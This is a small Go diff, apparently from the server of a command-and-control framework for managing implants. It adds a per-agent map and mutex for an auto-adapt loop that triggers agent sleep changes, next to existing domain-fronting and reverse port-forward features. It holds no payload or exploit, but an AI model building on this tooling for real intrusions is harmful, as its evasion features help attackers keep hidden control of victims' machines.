@@ -64,6 +64,10 @@ type Server struct {
 	trafficLog  *trafficRing
 	updateState updateCheckState
 
+	// Server-side traffic auto-adapt loop: last set_sleep trigger per agent
+	autoAdaptMu   sync.Mutex
+	autoAdaptLast map[string]time.Time
+
 	// Domain fronting
 	domainFrontDomains []string
 	domainFrontMu      sync.Mutex
@@ -319,6 +323,7 @@ func New(cfg *config.Config, database *gorm.DB) *Server {
 		screenMonitorImplants: make(map[string]time.Time),
 		rportfwdListeners:     make(map[string]*rportfwdRelay),
 		trafficLog:            newTrafficRing(),
+		autoAdaptLast:         make(map[string]time.Time),
 		eventManager:          NewEventManager(database),
 		operatorSessions:      &operatorSessionTracker{sessions: make(map[uint]*WSOperatorSession)},
 		credCheckFuse:         newCredCheckFuseTracker(),
